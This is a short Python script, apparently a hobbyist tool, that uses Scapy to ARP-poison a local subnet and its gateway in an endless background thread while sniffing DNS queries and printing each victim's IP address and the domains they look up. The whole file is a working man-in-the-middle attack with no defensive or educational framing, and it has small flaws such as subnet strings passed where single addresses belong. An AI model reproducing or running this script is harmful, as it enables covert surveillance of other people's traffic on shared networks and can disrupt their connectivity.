import logging
from scapy.all import ARP , send , sniff
from scapy.layers.dns import DNS , DNSQR , IP
import threading
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def arp_spoof(target_ip,spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)
    

def dns_packet(packet):
    if packet.haslayer(DNSQR) and packet.getlayer(DNS).qr == 0:
        ip_src = packet[IP].src
        dns_query = packet[DNSQR].qname.decode()
        print(ip_src,dns_query)
        

    
def start_arp(target_ip, getway_ip):
    while True:
        arp_spoof(target_ip, getway_ip)
        arp_spoof(getway_ip, target_ip)


target_ip = "192.168.0.0/24"
getway_ip = "192.168.0.1/24"

threading.Thread(target=start_arp, args=(target_ip, getway_ip),daemon=True).start()

print("[+] Network sniffing started...")
print("-" * 40)
print(f"{'ip address':<20}\t {'DNS Query':>30}")
print("-" * 40)
sniff(filter="udp port 53", prn=dns_packet, store=0)
